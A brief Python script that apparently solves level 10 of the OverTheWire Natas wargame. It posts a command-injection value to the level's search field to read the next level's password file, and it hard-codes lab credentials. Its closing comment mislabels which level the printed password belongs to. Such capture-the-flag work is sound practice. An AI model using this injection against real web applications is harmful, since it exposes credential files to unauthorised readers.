import requests


username="natas10"
password="nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"

url=str("http://%s.natas.labs.overthewire.org" %username)


r=requests.post(url,auth=(username,password),data={'needle':'. /etc/natas_webpass/natas11 #','submit':'submit'})
print(r.text)
#The password for natas10 is U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

